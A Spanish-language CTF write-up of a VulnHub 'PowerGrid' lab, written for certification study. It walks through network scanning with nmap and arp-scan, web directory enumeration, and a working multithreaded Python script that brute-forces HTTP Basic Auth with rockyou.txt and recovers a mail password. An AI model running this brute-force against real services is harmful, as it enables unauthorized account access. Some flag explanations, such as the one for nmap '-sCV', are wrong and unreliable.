Este write-up es más que un simple registro de mis logros en el campo de la seguridad informática. Es un testimonio de mi compromiso con la superación personal y la adquisición de conocimientos valiosos en un campo altamente demandante y desafiante.
ValenteSpiegel.
### Preparación para certificaciones.
==eWPT  
eWPTXv2  
OSWE 
Buffer Overflow

---
### Descripcion

Los ciberdelincuentes han tomado el control de la red eléctrica en toda Europa. Como miembro del servicio de seguridad, se te ha asignado la tarea de infiltrarte en su servidor, obtener acceso de root y evitar que lancen su malware antes de que sea demasiado tarde.
Sabemos, según información previa, que este grupo a veces utiliza contraseñas débiles. Te recomendamos que explores primero este vector de ataque y asegúrate de configurar correctamente tus herramientas. No tenemos tiempo que perder.
Desafortunadamente, los delincuentes han iniciado un temporizador de 3 horas. ¿Podrás llegar a su servidor a tiempo antes de que desplieguen su malware y destruyan las pruebas en su servidor?

Este ejercicio está diseñado para completarse de una sola vez. Apagar la máquina virtual no pausará el temporizador. Una vez que el temporizador haya finalizado, la máquina CTF se apagará y no podrás reiniciarla. Por favor, realiza una copia de seguridad local de la CTF antes de comenzar, en caso de que desees intentarlo nuevamente.

---
### Alcance (Scope)

Alcance (Scope): El alcance define los límites y los objetivos de la evaluación ética. Se determina qué áreas de la máquina y de la red están dentro del alcance de la evaluación y cuáles están fuera de ella. Esto ayuda a asegurar que las pruebas se realicen dentro de los límites acordados y evita cualquier impacto no deseado en sistemas no relacionados.

Information Leakage  
Github Project Enumeration 
SQLI (SQL Injection)  
Chisel (Remote Port Forwarding) + Abusing Internal Web Server  
Bash History - Information Leakage [User Pivoting]  
Abusing Sudoers Privilege [Privilege Escalation]

Fugas de Información
Enumeración de Proyectos en Github
Inyección SQL (SQL Injection) 
Chisel (Reenvío Remoto de Puertos) + Abuso del Servidor Web Interno 
Historial de Bash - Fugas de Información [Pivoteo de Usuario] 
Abuso de los Privilegios de Sudoers [Escalada de Privilegios]

---
### ==Reconocimiento y Enumeración.

En conjunto, el Reconocimiento y la Enumeración permiten a los evaluadores de seguridad obtener una imagen completa del objetivo y su infraestructura. Esta información es esencial para planificar y ejecutar pruebas de seguridad más específicas y efectivas, ayudando a identificar posibles vulnerabilidades y riesgos de seguridad.

### Reconocimiento (Reconnaissance): 
Esta etapa implica la recopilación de información sobre el objetivo de la evaluación. El objetivo es obtener una visión general de la infraestructura, sistemas, servicios y posibles puntos de entrada. Durante el reconocimiento, se utilizan técnicas y herramientas para obtener información relevante sin interactuar directamente con el objetivo. Esto puede incluir la búsqueda de información pública, como registros de dominio, direcciones IP, nombres de host, correos electrónicos, nombres de usuarios, entre otros. El reconocimiento puede proporcionar una imagen inicial de la superficie de ataque y ayudar a identificar posibles vías de entrada.

### Enumeración: 
La enumeración implica un análisis más detallado y exhaustivo del objetivo. Durante esta etapa, se busca identificar y recopilar información específica sobre los sistemas y servicios encontrados durante el reconocimiento. Esto puede incluir la enumeración de puertos abiertos, servicios y versiones de software, usuarios y grupos, configuraciones de seguridad, políticas y permisos. La enumeración se basa en técnicas y herramientas más interactivas que permiten obtener información más detallada y precisa. El objetivo principal de la enumeración es identificar posibles vulnerabilidades y debilidades que puedan ser explotadas durante las pruebas de penetración.

---
### ==Reconocimiento
<img src=" C:\Users\balld\OneDrive\Imágenes\Evidencia\Captura de pantalla -2023-05-19 21-35-15.png" alt="Texto alternativo" width="1000" height="700">

==sudo netdiscover

Es una herramienta de escaneo de red que se utiliza para descubrir dispositivos en una red local. Al ejecutar este comando con privilegios de superusuario (sudo), se escaneará la red y mostrará información sobre las direcciones IP, direcciones MAC y nombres de host de los dispositivos encontrados.
```
sudo arp-scan -I ens160 --localnet --ignoredups

-"sudo": Ejecuta el comando con privilegios de superusuario para obtener acceso a las    funcionalidades de escaneo de red.

-"arp-scan": Es el nombre del comando utilizado para realizar el escaneo ARP.

-"-I ens160": Especifica la interfaz de red a utilizar para el escaneo. En este caso, 

-"ens160" es el nombre de la interfaz de red.

-"--localnet": Indica que el escaneo se realizará en la red local.

-"--ignoredups": Ignora las respuestas duplicadas durante el escaneo, evitando que se    muestren múltiples entradas para el mismo dispositivo.
```

### El resultado de estos 2 comandos nos dan como coincidencia una IP con MAC de VMware y por ende la maquina que buscamos.==192.168.182.129 VMware,Inc.

**==ping -C 1 192.168.182.129**

El comando "ping" se utiliza comúnmente para verificar la conectividad y la disponibilidad de una máquina o dispositivo en una red. Al enviar un paquete de ping a una dirección IP o nombre de host, se espera recibir una respuesta de tipo ECHO_REPLY si la máquina o dispositivo está alcanzable y responde a los mensajes de ping.

---
### ==Enumeración

<img src=" C:\Users\balld\OneDrive\Imágenes\Evidencia\Captura de pantalla -2023-05-19 21-38-41.png" alt="Texto alternativo" width="1000" height="700">
```
sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 192.168.182.129

-`sudo`: Ejecuta el comando con privilegios de superusuario para acceder a funciones y    recursos de red adicionales.

-`nmap`: Lanza la herramienta Nmap para realizar el escaneo de puertos.

-`-p-`: Escanea todos los puertos, desde el puerto 1 hasta el puerto máximo permitido    (65535). Esta opción se utiliza para realizar un escaneo exhaustivo de todos los        puertos en el objetivo.

-`-sS`: Utiliza un escaneo de tipo SYN (Synchronize) para verificar la disponibilidad   
 de los puertos. Envía paquetes SYN al objetivo y analiza las respuestas para            determinar si los puertos están abiertos, cerrados o filtrados.

-`--min-rate 5000`: Establece la tasa mínima de paquetes enviados por segundo en 5000.    Esta opción se utiliza para enviar paquetes a una velocidad más alta, lo que puede      ayudar a acelerar el escaneo en redes rápidas.

-`--open`: Muestra solo los puertos abiertos en el resultado del escaneo. Filtra la       salida para mostrar solo la información relevante de los puertos que están accesibles.

-`-vvv`: Establece el nivel de verbosidad del escaneo en "muy, muy, muy" detallado.       Proporciona información adicional y detalles sobre el escaneo en la salida.

`-n`: Esta opción indica a Nmap que no realice la resolución inversa de DNS para las     direcciones IP que se están escaneando. Evita que Nmap intente determinar los nombres   de host asociados a las direcciones IP, lo que puede agilizar el escaneo.

-`-Pn`: Ignora el descubrimiento de hosts y trata todos los objetivos como si             estuvieran en línea. Esta opción se utiliza cuando no se desea realizar una             comprobación de estado de los hosts objetivo.

-`192.168.182.129`: Especifica la dirección IP de destino que se va a escanear.
```

### Open Ports.

==80/tcp open http sny-ack ttl 64

```
- Puerto TCP 80: El puerto TCP 80 es el puerto estándar utilizado para el protocolo HTTP (Hypertext Transfer Protocol). Es el puerto utilizado para comunicaciones web, y generalmente se utiliza para el tráfico HTTP no cifrado.

- Open: El término "open" indica que el puerto está accesible y responde a las solicitudes de conexión. Si un puerto está "closed" (cerrado), significa que está accesible pero no responde, mientras que "filtered" (filtrado) indica que el puerto está bloqueado por un firewall u otra medida de seguridad.

- HTTP: HTTP es un protocolo de aplicación utilizado para la transferencia de información en la web. Es el protocolo estándar para la comunicación entre un cliente web (como un navegador) y un servidor web. HTTP es ampliamente utilizado para cargar páginas web, transmitir contenido y realizar interacciones en línea.

- SYN-ACK: SYN-ACK es una combinación de banderas (flags) en el protocolo TCP que indica una respuesta a una solicitud de sincronización (SYN). En este contexto, el mensaje "sny-ack" puede ser una errata o una combinación de las banderas SYN y ACK.

- TTL 64: TTL (Time To Live) es un campo en los paquetes IP (Internet Protocol) que indica cuántos saltos o enrutadores puede pasar un paquete antes de que se deseche. Un valor de TTL de 64 es comúnmente utilizado y significa que el paquete puede atravesar hasta 64 saltos en la red antes de ser descartado. Este valor puede variar dependiendo de la configuración de la red.
```

==143/tcp open imap sny-ack ttl 64

```
- Puerto TCP 143: El puerto TCP 143 es el puerto estándar utilizado para el protocolo IMAP (Internet Message Access Protocol). IMAP es un protocolo utilizado para acceder y gestionar correos electrónicos almacenados en un servidor remoto. Permite a los clientes de correo electrónico descargar mensajes, organizar carpetas y sincronizar cambios entre el cliente y el servidor.

- Open: El término "open" indica que el puerto está accesible y responde a las solicitudes de conexión. Si un puerto está "closed" (cerrado), significa que está accesible pero no responde, mientras que "filtered" (filtrado) indica que el puerto está bloqueado por un firewall u otra medida de seguridad.
   
- IMAP: IMAP es un protocolo de aplicación utilizado para la recuperación y gestión de correos electrónicos. A diferencia del protocolo POP (Post Office Protocol), IMAP permite a los usuarios mantener los mensajes de correo electrónico en el servidor y acceder a ellos desde diferentes dispositivos. Esto permite una sincronización más completa y una mejor gestión de los correos electrónicos.
   
- SYN-ACK: SYN-ACK es una combinación de banderas (flags) en el protocolo TCP que indica una respuesta a una solicitud de sincronización (SYN). En este contexto, el mensaje "sny-ack" puede ser una errata o una combinación de las banderas SYN y ACK.
   
- TTL 64: TTL (Time To Live) es un campo en los paquetes IP (Internet Protocol) que indica cuántos saltos o enrutadores puede pasar un paquete antes de que se deseche. Un valor de TTL de 64 es comúnmente utilizado y significa que el paquete puede atravesar hasta 64 saltos en la red antes de ser descartado. Este valor puede variar dependiendo de la configuración de la red.
```

==993/tcp open imaps sny-ack ttl 64

```
- Puerto TCP 993: El puerto TCP 993 es el puerto estándar utilizado para el protocolo IMAPS, que es una versión segura y encriptada del protocolo IMAP. IMAPS utiliza cifrado SSL/TLS para proteger la comunicación entre el cliente de correo electrónico y el servidor, asegurando que los datos de correo electrónico se transmitan de manera segura.
   
- Open: El término "open" indica que el puerto está accesible y responde a las solicitudes de conexión. Si un puerto está "closed" (cerrado), significa que está accesible pero no responde, mientras que "filtered" (filtrado) indica que el puerto está bloqueado por un firewall u otra medida de seguridad.
   
- IMAPS: IMAPS es una variante segura del protocolo IMAP que utiliza cifrado SSL/TLS para proteger la confidencialidad e integridad de los datos de correo electrónico. Esto garantiza que la información de inicio de sesión y los mensajes de correo electrónico transmitidos estén protegidos contra el acceso no autorizado.
   
- SYN-ACK: SYN-ACK es una combinación de banderas (flags) en el protocolo TCP que indica una respuesta a una solicitud de sincronización (SYN). En este contexto, el mensaje "sny-ack" puede ser una errata o una combinación de las banderas SYN y ACK.
   
- TTL 64: TTL (Time To Live) es un campo en los paquetes IP (Internet Protocol) que indica cuántos saltos o enrutadores puede pasar un paquete antes de que se deseche. Un valor de TTL de 64 es comúnmente utilizado y significa que el paquete puede atravesar hasta 64 saltos en la red antes de ser descartado. Este valor puede variar dependiendo de la configuración de la red
```

### Tomados en conjunto, estos tres puertos abiertos indican que el servidor está ofreciendo servicios web a través del puerto 80, así como servicios de correo electrónico a través de los puertos 143 (IMAP) y 993 (IMAPS). 

---
### ==Descubrimiento

<img src=" C:\Users\balld\OneDrive\Imágenes\Evidencia\Captura de pantalla -2023-05-19 21-41-56.png" alt="Texto alternativo" width="1000" height="700">
==sudo nmap -sCV -p80,143,993 192.168.182.129 -oN targeted

```

- "sudo": Es un comando utilizado en sistemas basados en Unix (como Linux) que permite ejecutar el siguiente comando con privilegios de superusuario. Esto es necesario para acceder a ciertos recursos y realizar escaneos de puertos.
   
- "nmap": Es la herramienta utilizada para realizar el escaneo de puertos.
   
- "-sCV": Son las opciones del escaneo de Nmap:
   
"-s" indica el tipo de escaneo a realizar. En este caso, se utiliza el escaneo SYN (TCP SYN scan), que es uno de los métodos más comunes para identificar puertos abiertos en un host remoto.
"-C" activa la detección de versiones y scripts de Nmap. Esto significa que Nmap intentará obtener información adicional sobre los servicios que se ejecutan en los puertos abiertos.
"-V" habilita la salida detallada, mostrando información adicional sobre el progreso y los resultados del escaneo.

- "-p80,143,993": Especifica los puertos que se van a escanear. En este caso, se están escaneando los puertos 80 (HTTP), 143 (IMAP) y 993 (IMAPS).
   
- "192.168.182.129": Es la dirección IP del objetivo que se va a escanear. En este ejemplo, se escanea el host con la dirección IP 192.168.182.129.
- 
- "-oN targeted": Esta opción especifica el nombre y el formato del archivo de salida. En este caso, el resultado del escaneo se guardará en un archivo llamado "targeted" en formato normalizado (Nmap).

```

==whatweb 192.168.182.129

```
intentará obtener información sobre el sitio web alojado en esa dirección IP. Esto incluye detalles como el servidor web utilizado, la tecnología subyacente, los lenguajes de programación utilizados, los sistemas de gestión de contenido (CMS) instalados y posibles vulnerabilidades conocidas.
```
 
### ==Con esta información, tenemos claro que la maquina esta levantando un servicio web por el puerto 80 el cual se procederá a investigar.

<img src=" C:\Users\balld\OneDrive\Documentos\Cursos\VulnHub\Evidencia-powergrid\Captura de pantalla -2023-05-20 00-15-17.png" alt="Texto alternativo" width="1000" height="700">
==Advertencia del grupo de cibercriminales Amenazando con destruir la infrstructura de electricidad y pidiendo el rescate  de esta, se puede observar 3 nombres de usuario potenciales en el sisitema llamados "deez1, p48 y all2" 

---
# Explotación
*Escaneo de directorios web.*

Gobuster es una herramienta de línea de comandos que se utiliza para realizar ataques de fuerza bruta o escaneo de directorios en servicios web. Con la opción "dir" de Gobuster, puedes enumerar los directorios y archivos presentes en un sitio web.

==gobuster 192.168.182.129

El resultado nos arroja un directorio desconocido el cual se llama zmail
*Zmail como un cliente de correo electrónico: Zmail fue un cliente de correo electrónico desarrollado por Z-Code Software. Fue popular en la década de 1990 y estaba disponible para sistemas operativos como DOS y Windows. Sin embargo, Zmail ya no está en desarrollo activo y ha sido reemplazado por otros clientes de correo electrónico más modernos.*
<img src=" C:\Users\balld\OneDrive\Documentos\Cursos\VulnHub\Evidencia-powergrid\Captura de pantalla -2023-05-19 22-35-53.png" alt="Texto alternativo" width="1000" height="700">
### ==El cual nos requieres un correo y contraseña.
==Gracias a la inteligencia de investigación se sabe que el quipo de cibercriminales utiliza contraseñas simples y vulnerables, con los 3 usuarios ya tenemos una manera de empezar a atacar por fuerza bruta intentando capturar la contraseña con un script en python. 
<img src=" C:\Users\balld\OneDrive\Documentos\Cursos\VulnHub\Evidencia-powergrid\Captura de pantalla -2023-05-19 22-36-57.png" alt="Texto alternativo" width="1000" height="700">
==Antes de eso se procede a ver como funcia las peticiones de la pagina web con BrupSuite.,

<img src=" C:\Users\balld\OneDrive\Documentos\Cursos\VulnHub\Evidencia-powergrid\Captura de pantalla -2023-05-19 22-40-43.png" alt="Texto alternativo" width="1000" height="700">
==La petición hace viajar el correo y contraseña en base64..
Esto nos ayudara a la creacion de un script en python que por medio de fuerza bruta me determine la contraseña correcta.

```
#!/usr/bin/python3

import requests
import sys
import signal
import time
import pdb
import concurrent.futures
from base64 import b64encode
from base64 import b64decode
from pwn import *

# Definición del manejador de señal para Ctrl+C
def def_handler(signal, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Asociación de la señal SIGINT con el manejador
signal.signal(signal.SIGINT, def_handler)

# URL principal del servicio web objetivo
main_url = "http://192.168.182.129/zmail"

# Función para realizar la autenticación con combinaciones de usuario y contraseña
def makeAuthentication(combination_b64, p1):
    combination = combination_b64.decode()
    headers = {
        'Authorization': 'Basic %s' % combination
    }
    r = requests.get(main_url, headers=headers)
    if r.status_code != 401:
        p1.success("La contraseña es %s" % (b64decode(combination)).decode())
        sys.exit(0)

# Función para realizar el proceso de fuerza bruta
def makeAuthorization():
    users = ["deez1", "p48", "all2"]
    f = open("/usr/share/wordlists/rockyou.txt", "rb")
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
    counter = 1
    for password in f.readlines():
        with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
            password = (password.strip()).decode()
            for user in users:
                combination = user + ':' + password
                p1.status("Probando con la contraseña [%d/14344392]: %s" % (counter, combination.split(':')[1]))
                combination_b64 = b64encode(combination.encode())
                executor.submit(makeAuthentication, combination_b64, p1)
                counter += 1

# Punto de entrada principal del script
if __name__ == '__main__':
    makeAuthorization()


```

Programa escrito en Python que realiza un proceso de fuerza bruta para descubrir contraseñas en un servicio web. 

1. Importación de módulos:  
  - El script comienza importando varios módulos necesarios para su funcionamiento, como `requests`, `sys`, `signal`, `time`, `pdb`, `concurrent.futures` y los módulos `b64encode` y `b64decode` de la biblioteca `base64`. También se importa `pwn`, que es una biblioteca utilizada para la manipulación de binarios.

2. Definición de manejador de señal:
  - Se define una función `def_handler` que se utilizará para manejar la señal SIGINT, que se activa cuando se presiona Ctrl+C. Cuando se detecta la señal, esta función muestra un mensaje de salida y finaliza el script.
  - 
1. Definición de la URL principal:   
  - Se establece la variable `main_url` con la URL del servicio web objetivo.

2. Función `makeAuthentication`:
  - Esta función se encarga de realizar la autenticación utilizando combinaciones de nombres de usuario y contraseñas codificadas en base64.
   - Toma como argumentos `combination_b64` (una combinación de usuario:contraseña codificada en base64) y `p1` (un objeto de progreso para mostrar el progreso del proceso).   
   - Se decodifica la combinación y se establecen los encabezados de la solicitud HTTP con la autenticación básica.    
    Se realiza una solicitud GET a la URL principal con los encabezados establecidos.
   - Si el código de estado de la respuesta no es 401 (autenticación requerida), se muestra un mensaje exitoso con la contraseña descifrada y el script se finaliza.

5. Función `makeAuthorization`:
   - Esta función realiza el proceso de fuerza bruta para probar diferentes combinaciones de nombres de usuario y contraseñas.
  - Se definen una lista de usuarios y se abre un archivo de lista de palabras ("rockyou.txt" en este caso) que contiene posibles contraseñas.
  - Se muestra un mensaje de progreso y se espera 2 segundos.
 - Se inicia un contador y se itera a través de cada línea del archivo de lista de palabras.
  - Se utiliza un bucle `for` para iterar sobre cada usuario en la lista de usuarios y se genera una combinación de usuario:contraseña.
  - La combinación se codifica en base64 y se envía a la función `makeAuthentication` utilizando un executor de `concurrent.futures.ThreadPoolExecutor` para procesar las solicitudes en paralelo.
  - Se actualiza el progreso y se incrementa el contador en cada iteración.

6. Bloque principal:
  - Se verifica si el script se está ejecutando directamente (no importado como módulo).
  - Si es así, se llama a la función `makeAuthorization` para iniciar el proceso de fuerza bruta.
  
 ==este script automatiza el proceso de fuerza bruta para probar diferentes combinaciones de usuarios y contraseñas en un servicio web. Utiliza la autenticación básica y un archivo de lista de palabras para probar las contraseñas y muestra un mensaje cuando encuentra una coincidencia exitosa.

<img src=" C:\Users\balld\OneDrive\Documentos\Cursos\VulnHub\Evidencia-powergrid\Captura de pantalla -2023-05-23 10-28-37.png" alt="Texto alternativo" width="1000" height="700">
==El script se ejecuta con éxito arrojándonos que la contraseña para el usuario "p48:electrico"

<img src=" C:\Users\balld\OneDrive\Documentos\Cursos\VulnHub\Evidencia-powergrid\Captura de pantalla -2023-05-19 22-40-20.png" alt="Texto alternativo" width="1000" height="700">
==Las cuales son correctas y podremos acceder al servicio de correo.
